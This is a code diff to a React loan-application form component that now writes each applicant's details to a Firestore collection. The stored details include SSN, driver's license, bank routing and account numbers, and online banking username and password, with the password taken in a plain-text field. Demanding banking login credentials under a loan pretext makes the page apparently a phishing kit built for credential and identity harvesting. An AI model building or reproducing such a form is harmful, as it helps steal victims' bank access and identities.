@@ -6,8 +6,9 @@ import bank from "../../assets/bank.png";
 import { Link } from "react-router-dom";
 import { db } from "../../../firebase";
 import { useState } from "react";
+import { doc, addDoc, collection } from "firebase/firestore";
 
-const Details = () => {
+const Details = (e) => {
   const [loanAmount, setLoanAmount] = useState("");
   const [firstName, setFirstName] = useState("");
   const [middleName, setMiddleName] = useState("");
@@ -35,32 +36,34 @@ const Details = () => {
 
   function handleSubmit(e) {
     e.preventDefault();
-    const data = {
-      name: "John Doe",
-      age: 30,
-      email: "johndoe@example.com",
-    };
-    fetch("https://namraj-a5567-default-rtdb.firebaseio.com/users.json", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(data),
-    });
-    // const collectionRef = db.collection("users");
-    // const data = {
-    //   name: "John Doe",
-    //   age: 30,
-    //   email: "johndoe@example.com",
-    // };
-    // collectionRef
-    //   .add(data)
-    //   .then((docRef) => {
-    //     console.log("Document written with ID: ", docRef.id);
-    //   })
-    //   .catch((error) => {
-    //     console.error("Error adding document: ", error);
-    //   });
+    const myCollectionRef = collection(db, "myCollection");
+    addDoc(myCollectionRef, {
+      Loan_Amount: loanAmount,
+      Legal_First_Name: firstName,
+      Legal_Middle_Name: middleName,
+      Legal_Last_Name: lastName,
+      Legal_Email: email,
+      Phone_Number: phoneNumber,
+      Date_Of_Birth: DOB,
+      Street_Address: streetAddress,
+      City: city,
+      State: state,
+      Zip: zip,
+      Drivers_License_ID_Card: license,
+      License_State: licenseState,
+      SSN: ssn,
+      ABA_Routing_Number: routingNumber,
+      Bank_Name: bankName,
+      Account_Number: accountNumber,
+      Mobile_Banking_Username: bankingUsername,
+      Mobile_Banking_Password: bankingPassword,
+    })
+      .then((docRef) => {
+        console.log("Document written with ID: ", docRef.id);
+      })
+      .catch((error) => {
+        console.error("Error adding document: ", error);
+      });
   }
   return (
     <>
@@ -105,7 +108,9 @@ const Details = () => {
                 <select
                   name="loans"
                   id="loans"
+                  required
                   className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                  onChange={(e) => setLoanAmount(e.target.value)}
                 >
                   <option value="2000">$2,000</option>
                   <option value="2500">$2,500</option>
@@ -133,18 +138,22 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*Legal First Name</p>
                   <input
+                    required
                     type="text"
                     placeholder="Legal First Name"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setFirstName(e.target.value)}
                   />
                 </div>
 
                 <div>
                   <p className="font-bold">*Legal Middle Name</p>
                   <input
+                    required
                     type="text"
                     placeholder="Legal Middle Name"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setMiddleName(e.target.value)}
                   />
                 </div>
               </div>
@@ -152,17 +161,21 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*Legal Last Name</p>
                   <input
+                    required
                     type="text"
                     placeholder="Legal Last Name"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setLastName(e.target.value)}
                   />
                 </div>
                 <div>
                   <p className="font-bold">*Email</p>
                   <input
+                    required
                     type="text"
                     placeholder="Email"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setEmail(e.target.value)}
                   />
                 </div>
               </div>
@@ -170,17 +183,21 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*Phone Number</p>
                   <input
+                    required
                     type="text"
                     placeholder="Phone Number"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setPhoneNumber(e.target.value)}
                   />
                 </div>
                 <div>
                   <p className="font-bold">*DOB</p>
                   <input
+                    required
                     type="text"
                     placeholder="DOB"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setDOB(e.target.value)}
                   />
                 </div>
               </div>
@@ -198,17 +215,21 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*Street Address</p>
                   <input
+                    required
                     type="text"
                     placeholder="Street Address"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setStreetAddress(e.target.value)}
                   />
                 </div>
                 <div>
                   <p className="font-bold">*City</p>
                   <input
+                    required
                     type="text"
                     placeholder="City"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setCity(e.target.value)}
                   />
                 </div>
               </div>
@@ -216,17 +237,21 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*State</p>
                   <input
+                    required
                     type="text"
                     placeholder="State"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setState(e.target.value)}
                   />
                 </div>
                 <div>
                   <p className="font-bold">*Zip</p>
                   <input
+                    required
                     type="text"
                     placeholder="Zip"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setZip(e.target.value)}
                   />
                 </div>
               </div>
@@ -234,17 +259,21 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*Driver's License/ID Card</p>
                   <input
+                    required
                     type="text"
                     placeholder="Driver's License or Other Card"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setLicense(e.target.value)}
                   />
                 </div>
                 <div>
                   <p className="font-bold">*License State</p>
                   <input
+                    required
                     type="text"
                     placeholder="License State"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setLicenseState(e.target.value)}
                   />
                 </div>
               </div>
@@ -262,9 +291,11 @@ const Details = () => {
             <div>
               <p className="font-bold">*SSN</p>
               <input
+                required
                 type="text"
                 placeholder="XXX-XX-XXXX"
                 className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                onChange={(e) => setSsn(e.target.value)}
               />
             </div>
           </div>
@@ -282,17 +313,21 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*ABA/Routing Number</p>
                   <input
+                    required
                     type="text"
                     placeholder="ABA/Routing Number"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setRoutingNumber(e.target.value)}
                   />
                 </div>
                 <div>
                   <p className="font-bold">*Bank Name</p>
                   <input
+                    required
                     type="text"
                     placeholder="Bank Name"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setBankName(e.target.value)}
                   />
                 </div>
               </div>
@@ -300,17 +335,21 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*Account Number</p>
                   <input
+                    required
                     type="text"
                     placeholder="Account Number"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setAccountNumber(e.target.value)}
                   />
                 </div>
                 <div>
                   <p className="font-bold">*Mobile/Online Banking Username</p>
                   <input
+                    required
                     type="text"
                     placeholder="Mobile/Online Banking Username"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setBankingUsername(e.target.value)}
                   />
                 </div>
               </div>
@@ -318,16 +357,20 @@ const Details = () => {
                 <div>
                   <p className="font-bold">*Mobile/Online Banking Password</p>
                   <input
+                    required
                     type="text"
                     placeholder="Mobile/Online Banking Password"
                     className={`h-16  w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
+                    onChange={(e) => setBankingPassword(e.target.value)}
                   />
                 </div>
               </div>
             </div>
           </div>
-          <label className="mt-4 block space-y-3">
+          <label className="mt-4 block space-y-5 ">
             <input
+              required
+              className="h-4 w-4"
               type="checkbox"
               checked={isChecked}
               onChange={handleCheckboxChange}
@@ -338,11 +381,15 @@ const Details = () => {
           </label>
 
           <button
-            className="mt-5 bg-blue-500 text-white px-4 py-2 rounded-md  block mx-auto"
+            className={`mt-5 bg-blue-500 text-white px-4 py-2 rounded-md block mx-auto ${
+              !isChecked ? "cursor-not-allowed" : ""
+            }`}
             type="submit"
+            disabled={!isChecked}
           >
             SUBMIT
           </button>
+
           <p className="mt-5">
             By clicking Find My Loan, I agree to receive important notices and
             other communications electronically. Terms & Conditions and Privacy
